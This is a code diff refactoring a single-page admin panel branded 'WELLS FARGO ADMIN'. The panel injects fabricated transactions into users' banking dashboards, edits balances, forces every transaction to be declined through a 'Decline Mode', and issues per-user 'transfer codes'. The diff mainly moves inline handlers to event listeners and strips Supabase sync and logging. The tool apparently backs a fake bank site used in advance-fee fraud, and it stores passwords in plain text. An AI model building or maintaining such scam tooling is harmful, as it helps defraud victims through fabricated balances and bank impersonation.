@@ -11,7 +11,7 @@
   --red: #C8102E; --gold: #FFCD00; --dark: #1a1a1a; --gray: #6b6b6b;
   --border: #ddd; --blue: #1e6eb5; --sidebar: #2d2d2d; --green: #1a7a1a;
 }
-body { font-family: 'Source Sans 3', sans-serif; background: #f5f5f5; color: var(--dark); min-height: 100vh; }
+body { font-family: 'Source Sans 3', sans-serif; background: #f5f5f5; color: var(--dark); min-height: 100vh; -webkit-text-size-adjust: 100%; }
 
 /* HEADER */
 .admin-header { background: var(--dark); color: #fff; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
@@ -62,7 +62,7 @@ tr:last-child td { border-bottom: none; }
 /* FORMS */
 .form-group { margin-bottom: 16px; }
 .form-label { display: block; font-size: 0.82rem; font-weight: 600; color: var(--gray); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-.form-input, .form-select { width: 100%; padding: 10px 12px; border: 1px solid var(--border); border-radius: 4px; font-size: 0.92rem; font-family: inherit; -webkit-appearance: none; -moz-appearance: none; appearance: none; }
+.form-input, .form-select { width: 100%; padding: 10px 12px; border: 1px solid var(--border); border-radius: 4px; font-size: 16px; font-family: inherit; -webkit-appearance: none; -moz-appearance: none; appearance: none; }
 .form-input:focus, .form-select:focus { border-color: var(--red); outline: none; box-shadow: 0 0 0 3px rgba(200,16,46,0.1); }
 .form-row { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
 
@@ -175,6 +175,10 @@ tr:last-child td { border-bottom: none; }
 
   .generated-code-item { flex-direction: column; gap: 8px; text-align: center; }
   .generated-code-item .code-info { align-items: center; }
+
+  input, select, textarea {
+    font-size: 16px !important;
+  }
 }
 
 @media (max-width: 480px) {
@@ -197,15 +201,15 @@ tr:last-child td { border-bottom: none; }
 
 <!-- HEADER -->
 <header class="admin-header">
-  <button class="mobile-menu-btn" onclick="toggleMobileNav()">&#9776;</button>
+  <button class="mobile-menu-btn" id="mobile-menu-btn">&#9776;</button>
   <div class="admin-logo">WELLS FARGO ADMIN</div>
   <nav class="admin-nav" id="admin-nav">
-    <a href="#" class="active" onclick="showSection('dashboard', event)">Dashboard</a>
-    <a href="#" onclick="showSection('users', event)">Users</a>
-    <a href="#" onclick="showSection('transactions', event)">Transactions</a>
-    <a href="#" onclick="showSection('add-transaction', event)">Add Transaction</a>
-    <a href="#" onclick="showSection('transfer-codes', event)">Transfer Codes</a>
-    <a href="#" onclick="openBankingPage()" style="color: var(--gold);">Open Banking</a>
+    <a href="#" class="active" id="nav-dashboard">Dashboard</a>
+    <a href="#" id="nav-users">Users</a>
+    <a href="#" id="nav-transactions">Transactions</a>
+    <a href="#" id="nav-add-transaction">Add Transaction</a>
+    <a href="#" id="nav-transfer-codes">Transfer Codes</a>
+    <a href="#" id="nav-open-banking" style="color: var(--gold);">Open Banking</a>
   </nav>
   <div class="admin-user">Admin Panel</div>
 </header>
@@ -241,7 +245,7 @@ tr:last-child td { border-bottom: none; }
     <div class="card">
       <div class="card-header">
         <h2>Recent Transactions</h2>
-        <button class="btn-small" onclick="showSection('transactions', event)">View All</button>
+        <button class="btn-small" id="view-all-txns">View All</button>
       </div>
       <div class="card-body" style="padding:0">
         <table>
@@ -266,7 +270,7 @@ tr:last-child td { border-bottom: none; }
     <div class="card">
       <div class="card-header">
         <h2>User Management</h2>
-        <button class="btn-small" onclick="openModal('add-user')">+ Add User</button>
+        <button class="btn-small" id="add-user-btn">+ Add User</button>
       </div>
       <div class="card-body" style="padding:0">
         <table>
@@ -291,7 +295,7 @@ tr:last-child td { border-bottom: none; }
     <div class="card">
       <div class="card-header">
         <h2>All Transactions</h2>
-        <button class="btn-small" onclick="showSection('add-transaction', event)">+ Add Transaction</button>
+        <button class="btn-small" id="add-txn-nav">+ Add Transaction</button>
       </div>
       <div class="card-body" style="padding:0">
         <table>
@@ -322,7 +326,7 @@ tr:last-child td { border-bottom: none; }
         <div class="alert alert-warning">
           <strong>Note:</strong> This will add a transaction that appears on the user's dashboard under "Recent Transactions".
         </div>
-        <form id="add-txn-form" onsubmit="handleAddTransaction(event)">
+        <form id="add-txn-form">
           <div class="form-row">
             <div class="form-group">
               <label class="form-label">Select User</label>
@@ -375,8 +379,8 @@ tr:last-child td { border-bottom: none; }
             <input type="text" class="form-input" id="txn-memo" placeholder="Add a note...">
           </div>
           <div style="display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap;">
-            <button type="submit" class="btn btn-primary">Add Transaction</button>
-            <button type="button" class="btn btn-secondary" onclick="showSection('transactions', event)">Cancel</button>
+            <button type="submit" class="btn btn-primary" id="submit-txn">Add Transaction</button>
+            <button type="button" class="btn btn-secondary" id="cancel-txn">Cancel</button>
           </div>
         </form>
       </div>
@@ -395,7 +399,7 @@ tr:last-child td { border-bottom: none; }
         </div>
         <div class="form-group">
           <label class="form-label">Select User</label>
-          <select class="form-select" id="code-user" onchange="loadUserCodes()">
+          <select class="form-select" id="code-user">
             <option value="">Select a user...</option>
           </select>
         </div>
@@ -408,8 +412,7 @@ tr:last-child td { border-bottom: none; }
             <option value="10">10 Codes</option>
           </select>
         </div>
-        <button class="btn btn-primary" onclick="generateCodes()" style="margin-bottom: 20px;">
-          <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align: middle; margin-right: 6px;"><path d="M12 5v14M5 12h14"/></svg>
+        <button class="btn btn-primary" id="generate-codes-btn" style="margin-bottom: 20px;">
           Generate Code(s)
         </button>
 
@@ -426,7 +429,7 @@ tr:last-child td { border-bottom: none; }
         <div class="transfer-codes-section" id="user-codes-section" style="display:none;">
           <div class="user-codes-header">
             <h3 style="font-size:1rem;font-weight:600;">User's Transfer Codes</h3>
-            <button class="btn btn-secondary btn-small" onclick="loadUserCodes()">Refresh</button>
+            <button class="btn btn-secondary btn-small" id="refresh-codes">Refresh</button>
           </div>
           <div class="generated-codes-list" id="user-codes-list"></div>
         </div>
@@ -436,7 +439,7 @@ tr:last-child td { border-bottom: none; }
     <div class="card">
       <div class="card-header">
         <h2>All Active Transfer Codes</h2>
-        <button class="btn-small" onclick="exportCodes()">Export</button>
+        <button class="btn-small" id="export-codes">Export</button>
       </div>
       <div class="card-body">
         <div id="all-codes-grid" class="codes-grid"></div>
@@ -447,10 +450,10 @@ tr:last-child td { border-bottom: none; }
   <!-- DEBUG SECTION -->
   <div class="debug-section">
     <h3>Debug Tools (For Testing)</h3>
-    <button class="btn debug-btn btn-secondary" onclick="openBankingPage()">Open Banking Page</button>
-    <button class="btn debug-btn btn-secondary" onclick="refreshData()">Refresh Data</button>
-    <button class="btn debug-btn btn-danger" onclick="clearAllData()">Clear All Data</button>
-    <button class="btn debug-btn btn-warning" onclick="showLocalStorage()">Show localStorage</button>
+    <button class="btn debug-btn btn-secondary" id="open-banking">Open Banking Page</button>
+    <button class="btn debug-btn btn-secondary" id="refresh-data">Refresh Data</button>
+    <button class="btn debug-btn btn-danger" id="clear-data">Clear All Data</button>
+    <button class="btn debug-btn btn-warning" id="show-storage">Show localStorage</button>
   </div>
 
 </div>
@@ -460,7 +463,7 @@ tr:last-child td { border-bottom: none; }
   <div class="modal">
     <div class="modal-header">
       <h3>Add New User</h3>
-      <button class="modal-close" onclick="closeModal('add-user')">&times;</button>
+      <button class="modal-close" id="close-add-user">&times;</button>
     </div>
     <div class="modal-body">
       <form id="add-user-form">
@@ -495,8 +498,8 @@ tr:last-child td { border-bottom: none; }
       </form>
     </div>
     <div class="modal-footer">
-      <button class="btn btn-secondary" onclick="closeModal('add-user')">Cancel</button>
-      <button class="btn btn-primary" onclick="addUser()">Add User</button>
+      <button class="btn btn-secondary" id="cancel-add-user">Cancel</button>
+      <button class="btn btn-primary" id="confirm-add-user">Add User</button>
     </div>
   </div>
 </div>
@@ -506,7 +509,7 @@ tr:last-child td { border-bottom: none; }
   <div class="modal">
     <div class="modal-header">
       <h3>Edit User</h3>
-      <button class="modal-close" onclick="closeModal('edit-user')">&times;</button>
+      <button class="modal-close" id="close-edit-user">&times;</button>
     </div>
     <div class="modal-body">
       <form id="edit-user-form">
@@ -530,12 +533,11 @@ tr:last-child td { border-bottom: none; }
           <input type="number" class="form-input" id="edit-retire" step="0.01">
         </div>
 
-        <!-- TRANSACTION CONTROL -->
         <div style="margin-top: 20px; padding-top: 20px; border-top: 2px solid #eee;">
           <h4 style="font-size: 0.9rem; margin-bottom: 12px; color: var(--dark);">Transaction Controls</h4>
 
           <div class="alert alert-danger" style="margin-bottom: 12px;">
-            <strong>Decline Mode:</strong> When enabled, ALL transactions for this user will be declined with a "Contact Support" message.
+            <strong>Decline Mode:</strong> When enabled, ALL transactions for this user will be declined.
           </div>
 
           <div class="toggle-group">
@@ -553,8 +555,8 @@ tr:last-child td { border-bottom: none; }
       </form>
     </div>
     <div class="modal-footer">
-      <button class="btn btn-secondary" onclick="closeModal('edit-user')">Cancel</button>
-      <button class="btn btn-primary" onclick="saveUser()">Save Changes</button>
+      <button class="btn btn-secondary" id="cancel-edit-user">Cancel</button>
+      <button class="btn btn-primary" id="save-edit-user">Save Changes</button>
     </div>
   </div>
 </div>
@@ -581,7 +583,7 @@ function initSupabase() {
       console.log('Supabase initialized successfully');
       return true;
     } else {
-      console.warn('Supabase SDK not loaded, using localStorage fallback');
+      console.warn('Supabase SDK not loaded');
       return false;
     }
   } catch (e) {
@@ -593,7 +595,6 @@ function initSupabase() {
 // ── STATE MANAGEMENT ──
 const STORE_KEY = 'wf_db';
 
-// Default demo user
 const DEFAULT_USER = {
   id: 'demo-user',
   name: 'Andrew Johnson',
@@ -605,7 +606,10 @@ const DEFAULT_USER = {
   declineMode: false
 };
 
-// Check if localStorage is available
+let users = [];
+let transactions = [];
+let codes = [];
+
 function isLocalStorageAvailable() {
   try {
     const test = '__storage_test__';
@@ -617,7 +621,6 @@ function isLocalStorageAvailable() {
   }
 }
 
-// Initialize database
 function initDB() {
   let db = loadDB();
   if (!db.users || db.users.length === 0) {
@@ -625,18 +628,14 @@ function initDB() {
     db.transactions = [];
     db.codes = [];
     saveDB(db);
-    console.log('Database initialized with default user');
   }
   if (!db.codes) db.codes = [];
   if (!db.transactions) db.transactions = [];
   saveDB(db);
-  console.log('Current database:', db);
 }
 
-// Load from localStorage with robust error handling
 function loadDB() {
   if (!isLocalStorageAvailable()) {
-    console.warn('localStorage not available');
     return { users: [], transactions: [], codes: [] };
   }
 
@@ -651,101 +650,69 @@ function loadDB() {
     if (!db.codes) db.codes = [];
     return db;
   } catch(e) {
-    console.error('Error loading database:', e);
-    try {
-      localStorage.removeItem(STORE_KEY);
-    } catch (e2) {}
+    try { localStorage.removeItem(STORE_KEY); } catch (e2) {}
     return { users: [], transactions: [], codes: [] };
   }
 }
 
-// Save to localStorage with robust error handling
 function saveDB(db) {
-  if (!isLocalStorageAvailable()) {
-    console.warn('localStorage not available, changes will not persist');
-    return false;
-  }
+  if (!isLocalStorageAvailable()) return false;
 
   try {
     localStorage.setItem(STORE_KEY, JSON.stringify(db));
-    console.log('Database saved:', db);
     return true;
   } catch(e) {
     console.error('Error saving database:', e);
-    if (e.name === 'QuotaExceededError') {
-      try {
-        if (db.transactions && db.transactions.length > 50) {
-          db.transactions = db.transactions.slice(0, 50);
-          localStorage.setItem(STORE_KEY, JSON.stringify(db));
-        }
-      } catch (e2) {
-        console.error('Failed to save after cleanup:', e2);
-      }
-    }
     return false;
   }
-}
-
-let users = [];
-let transactions = [];
-let codes = [];
-
-function toggleMobileNav() {
-  document.getElementById('admin-nav').classList.toggle('open');
 }
 
 // ── UTILS ──
 function fmt(n) { return '$' + Number(n || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
 function formatDate(d) { return new Date(d).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }); }
-function showLoading(text = 'Loading...') { document.getElementById('loading-text').textContent = text; document.getElementById('loading').classList.add('on'); }
+function showLoading(text) { document.getElementById('loading-text').textContent = text || 'Loading...'; document.getElementById('loading').classList.add('on'); }
 function hideLoading() { document.getElementById('loading').classList.remove('on'); }
-function showSection(id, e) {
-  if (e) e.preventDefault();
+
+function showSection(id) {
   document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
   const section = document.getElementById('section-' + id);
   if (section) section.classList.add('active');
   document.querySelectorAll('.admin-nav a').forEach(a => a.classList.remove('active'));
-  if (e && e.target) e.target.classList.add('active');
-  toggleMobileNav();
+  const navLink = document.getElementById('nav-' + id);
+  if (navLink) navLink.classList.add('active');
+
+  const nav = document.getElementById('admin-nav');
+  if (nav) nav.classList.remove('open');
 
   if (id === 'transfer-codes') {
     loadAllCodes();
     populateCodeUserSelect();
   }
-
-  if (id === 'transactions' || id === 'add-transaction') {
-    refreshData();
-  }
+  if (id === 'users') renderUsers();
+  if (id === 'transactions') renderTransactions();
+  if (id === 'add-transaction') populateUserSelect();
 }
+
 function openModal(id) { document.getElementById('modal-' + id).classList.add('on'); }
 function closeModal(id) { document.getElementById('modal-' + id).classList.remove('on'); }
-function toast(msg, isErr = false) {
+
+function toast(msg, isErr) {
   const t = document.getElementById('toast');
-  t.textContent = msg; t.className = 'toast' + (isErr ? ' err' : '');
+  t.textContent = msg;
+  t.className = 'toast' + (isErr ? ' err' : '');
   t.classList.add('show');
   setTimeout(() => t.classList.remove('show'), 3200);
 }
 
 // ── DATA LOADING ──
-async function loadData() {
+function loadData() {
   showLoading('Loading data...');
-
-  // Try to sync from Supabase first if available
-  if (supabaseReady) {
-    try {
-      await syncFromSupabase();
-    } catch (e) {
-      console.error('Failed to sync from Supabase:', e);
-    }
-  }
 
   setTimeout(() => {
     const db = loadDB();
     users = db.users || [];
     transactions = db.transactions || [];
     codes = db.codes || [];
-
-    console.log('Data loaded - Users:', users.length, 'Transactions:', transactions.length, 'Codes:', codes.length);
 
     updateDashboard();
     renderUsers();
@@ -755,34 +722,11 @@ async function loadData() {
   }, 300);
 }
 
-// Sync data from Supabase
-async function syncFromSupabase() {
-  if (!supabaseReady) return;
-
-  try {
-    // Fetch users from Supabase
-    const { data: supabaseUsers, error: usersError } = await supabase
-      .from('users')
-      .select('*');
-
-    if (!usersError && supabaseUsers && supabaseUsers.length > 0) {
-      console.log('Synced', supabaseUsers.length, 'users from Supabase');
-      // Note: We merge with local data, preferring local for conflicts
-      // This is intentional to allow admin control
-    }
-  } catch (e) {
-    console.error('Supabase sync error:', e);
-  }
-}
-
-// ── REFRESH DATA ──
 function refreshData() {
   const db = loadDB();
   users = db.users || [];
   transactions = db.transactions || [];
   codes = db.codes || [];
-
-  console.log('Data refreshed - Users:', users.length, 'Transactions:', transactions.length);
 
   updateDashboard();
   renderUsers();
@@ -841,15 +785,13 @@ function renderUsers() {
       </tr>`;
     }).join('');
   } else {
-    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:#888">No users found. Add a user to get started.</td></tr>';
+    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;color:#888">No users found.</td></tr>';
   }
 }
 
 // ── RENDER TRANSACTIONS ──
 function renderTransactions() {
   const tbody = document.getElementById('all-txns');
-  console.log('Rendering transactions, count:', transactions.length);
-
   if (transactions.length > 0) {
     tbody.innerHTML = transactions.map(t => {
       const u = users.find(u => u.id === t.userId) || {};
@@ -877,7 +819,6 @@ function populateUserSelect() {
   }
 }
 
-// ── CODE USER SELECT ──
 function populateCodeUserSelect() {
   const select = document.getElementById('code-user');
   if (select) {
@@ -887,7 +828,7 @@ function populateCodeUserSelect() {
 }
 
 // ── ADD USER ──
-async function addUser() {
+function addUser() {
   const name = document.getElementById('user-name').value.trim();
   const username = document.getElementById('user-username').value.trim();
   const password = document.getElementById('user-password').value;
@@ -914,29 +855,9 @@ async function addUser() {
   saveDB(db);
   users = db.users;
 
-  // Sync to Supabase
-  if (supabaseReady) {
-    try {
-      await supabase.from('users').upsert({
-        id: newUser.id,
-        username: newUser.username,
-        password: newUser.password,
-        name: newUser.name,
-        checking: newUser.checking,
-        savings: newUser.savings,
-        retire: newUser.retire,
-        declineMode: false,
-        updated_at: new Date().toISOString()
-      });
-    } catch (e) {
-      console.error('Failed to sync user to Supabase:', e);
-    }
-  }
-
-  closeModal('add-user');
-  document.getElementById('add-user-form').reset();
-
   setTimeout(() => {
+    closeModal('add-user');
+    document.getElementById('add-user-form').reset();
     renderUsers();
     updateDashboard();
     populateUserSelect();
@@ -960,7 +881,7 @@ function editUser(id) {
   openModal('edit-user');
 }
 
-async function saveUser() {
+function saveUser() {
   const id = document.getElementById('edit-user-id').value;
   const name = document.getElementById('edit-name').value.trim();
   const checking = parseFloat(document.getElementById('edit-checking').value) || 0;
@@ -980,25 +901,6 @@ async function saveUser() {
     db.users[idx].declineMode = declineMode;
     saveDB(db);
     users = db.users;
-
-    // Sync to Supabase
-    if (supabaseReady) {
-      try {
-        await supabase.from('users').upsert({
-          id: db.users[idx].id,
-          username: db.users[idx].username,
-          password: db.users[idx].password,
-          name: db.users[idx].name,
-          checking: db.users[idx].checking,
-          savings: db.users[idx].savings,
-          retire: db.users[idx].retire,
-          declineMode: db.users[idx].declineMode,
-          updated_at: new Date().toISOString()
-        });
-      } catch (e) {
-        console.error('Failed to sync user update to Supabase:', e);
-      }
-    }
   }
 
   setTimeout(() => {
@@ -1010,17 +912,8 @@ async function saveUser() {
   }, 300);
 }
 
-// ── ADD TRANSACTION (HANDLER) ──
-function handleAddTransaction(e) {
-  e.preventDefault();
-  console.log('Form submitted, calling addTransaction');
-  addTransaction();
-}
-
 // ── ADD TRANSACTION ──
 function addTransaction() {
-  console.log('addTransaction called');
-
   const userId = document.getElementById('txn-user').value;
   const type = document.getElementById('txn-type').value;
   const amount = parseFloat(document.getElementById('txn-amount').value);
@@ -1029,8 +922,6 @@ function addTransaction() {
   const date = document.getElementById('txn-date').value;
   const status = document.getElementById('txn-status').value;
   const memo = document.getElementById('txn-memo').value;
-
-  console.log('Form values - userId:', userId, 'type:', type, 'amount:', amount, 'desc:', desc);
 
   if (!userId || !amount || !desc || !date) {
     toast('Please fill in all required fields.', true);
@@ -1053,27 +944,18 @@ function addTransaction() {
     to: account
   };
 
-  console.log('Creating transaction:', newTxn);
-
   const db = loadDB();
-
   db.transactions.unshift(newTxn);
-  console.log('Transactions after add:', db.transactions.length);
 
   if (type === 'credit' && status === 'success') {
     const userIdx = db.users.findIndex(u => u.id === userId);
     if (userIdx !== -1) {
       if (account.includes('Checking')) {
         db.users[userIdx].checking += amount;
-        console.log('Added to checking:', amount);
-      }
-      else if (account.includes('Savings')) {
+      } else if (account.includes('Savings')) {
         db.users[userIdx].savings += amount;
-        console.log('Added to savings:', amount);
-      }
-      else if (account.includes('Retire')) {
+      } else if (account.includes('Retire')) {
         db.users[userIdx].retire += amount;
-        console.log('Added to retire:', amount);
       }
     }
   }
@@ -1081,8 +963,6 @@ function addTransaction() {
   saveDB(db);
   transactions = db.transactions;
   users = db.users;
-
-  console.log('Database saved, transactions:', transactions.length);
 
   document.getElementById('add-txn-form').reset();
   document.getElementById('txn-date').valueAsDate = new Date();
@@ -1092,8 +972,7 @@ function addTransaction() {
     renderUsers();
     updateDashboard();
     hideLoading();
-    toast('Transaction added to user dashboard!');
-    console.log('UI updated');
+    toast('Transaction added successfully!');
   }, 300);
 }
 
@@ -1135,8 +1014,6 @@ function generateCodes() {
     if (generatedCodes.length === 1) {
       document.getElementById('new-code-value').textContent = generatedCodes[0].code;
       document.getElementById('generated-code-display').style.display = 'block';
-
-      // Copy to clipboard
       if (navigator.clipboard) {
         navigator.clipboard.writeText(generatedCodes[0].code).catch(() => {});
       }
@@ -1164,8 +1041,7 @@ function quickGenerateCode(userId) {
   const select = document.getElementById('code-user');
   if (select) select.value = userId;
   loadUserCodes();
-  const navLink = document.querySelector('.admin-nav a[onclick*="transfer-codes"]');
-  showSection('transfer-codes', { preventDefault: () => {}, target: navLink });
+  showSection('transfer-codes');
   setTimeout(() => generateCodes(), 100);
 }
 
@@ -1209,11 +1085,8 @@ function loadAllCodes() {
   const codesGrid = document.getElementById('all-codes-grid');
   if (!codesGrid) return;
 
-  const activeCodes = codes.filter(c => !c.used);
-  const usedCodes = codes.filter(c => c.used);
-
   if (codes.length > 0) {
-    const allCodesSorted = [...activeCodes, ...usedCodes];
+    const allCodesSorted = [...codes].sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
     codesGrid.innerHTML = allCodesSorted.map(c => {
       const u = users.find(user => user.id === c.userId) || {};
       const cardClass = c.used ? 'used' : '';
@@ -1255,9 +1128,9 @@ function exportCodes() {
 
 // ── DEBUG FUNCTIONS ──
 function openBankingPage() {
-  const bankingPages = ['wells-fargo-banking.html', 'banking.html', 'index.html'];
-  for (const page of bankingPages) {
-    if (confirm(`Open ${page}?`)) {
+  const pages = ['index.html', 'wells-fargo-banking.html', 'banking.html'];
+  for (const page of pages) {
+    if (confirm('Open ' + page + '?')) {
       window.open(page, '_blank');
       break;
     }
@@ -1265,7 +1138,7 @@ function openBankingPage() {
 }
 
 function clearAllData() {
-  if (confirm('Are you sure you want to clear ALL data? This will reset the database to default.')) {
+  if (confirm('Are you sure you want to clear ALL data?')) {
     localStorage.removeItem(STORE_KEY);
     initDB();
     loadData();
@@ -1278,18 +1151,79 @@ function showLocalStorage() {
   alert('localStorage["wf_db"] contains:\n\n' + JSON.stringify(db, null, 2));
 }
 
-// Set default date
+// ── EVENT LISTENERS ──
 document.addEventListener('DOMContentLoaded', function() {
+  // Initialize
+  initSupabase();
+  initDB();
+  loadData();
+
+  // Set default date
   const txnDateInput = document.getElementById('txn-date');
   if (txnDateInput) {
     txnDateInput.valueAsDate = new Date();
   }
 
-  // Initialize Supabase and database
-  initSupabase();
-  initDB();
-  loadData();
+  // Navigation
+  document.getElementById('nav-dashboard').addEventListener('click', function(e) { e.preventDefault(); showSection('dashboard'); });
+  document.getElementById('nav-users').addEventListener('click', function(e) { e.preventDefault(); showSection('users'); });
+  document.getElementById('nav-transactions').addEventListener('click', function(e) { e.preventDefault(); showSection('transactions'); });
+  document.getElementById('nav-add-transaction').addEventListener('click', function(e) { e.preventDefault(); showSection('add-transaction'); });
+  document.getElementById('nav-transfer-codes').addEventListener('click', function(e) { e.preventDefault(); showSection('transfer-codes'); });
+  document.getElementById('nav-open-banking').addEventListener('click', function(e) { e.preventDefault(); openBankingPage(); });
+
+  // Mobile menu
+  document.getElementById('mobile-menu-btn').addEventListener('click', function() {
+    document.getElementById('admin-nav').classList.toggle('open');
+  });
+
+  // Buttons
+  document.getElementById('add-user-btn').addEventListener('click', function() { openModal('add-user'); });
+  document.getElementById('view-all-txns').addEventListener('click', function() { showSection('transactions'); });
+  document.getElementById('add-txn-nav').addEventListener('click', function() { showSection('add-transaction'); });
+
+  // Modal buttons
+  document.getElementById('close-add-user').addEventListener('click', function() { closeModal('add-user'); });
+  document.getElementById('cancel-add-user').addEventListener('click', function() { closeModal('add-user'); });
+  document.getElementById('confirm-add-user').addEventListener('click', addUser);
+
+  document.getElementById('close-edit-user').addEventListener('click', function() { closeModal('edit-user'); });
+  document.getElementById('cancel-edit-user').addEventListener('click', function() { closeModal('edit-user'); });
+  document.getElementById('save-edit-user').addEventListener('click', saveUser);
+
+  // Transaction form
+  document.getElementById('submit-txn').addEventListener('click', function(e) {
+    e.preventDefault();
+    addTransaction();
+  });
+  document.getElementById('cancel-txn').addEventListener('click', function() {
+    document.getElementById('add-txn-form').reset();
+    document.getElementById('txn-date').valueAsDate = new Date();
+    showSection('transactions');
+  });
+
+  // Code user select change
+  document.getElementById('code-user').addEventListener('change', loadUserCodes);
+  document.getElementById('generate-codes-btn').addEventListener('click', generateCodes);
+  document.getElementById('refresh-codes').addEventListener('click', loadUserCodes);
+  document.getElementById('export-codes').addEventListener('click', exportCodes);
+
+  // Debug tools
+  document.getElementById('open-banking').addEventListener('click', openBankingPage);
+  document.getElementById('refresh-data').addEventListener('click', refreshData);
+  document.getElementById('clear-data').addEventListener('click', clearAllData);
+  document.getElementById('show-storage').addEventListener('click', showLocalStorage);
+
+  // Modal close on background click
+  document.querySelectorAll('.modal-overlay').forEach(function(overlay) {
+    overlay.addEventListener('click', function(e) {
+      if (e.target === overlay) {
+        overlay.classList.remove('on');
+      }
+    });
+  });
 });
 </script>
+
 </body>
 </html>
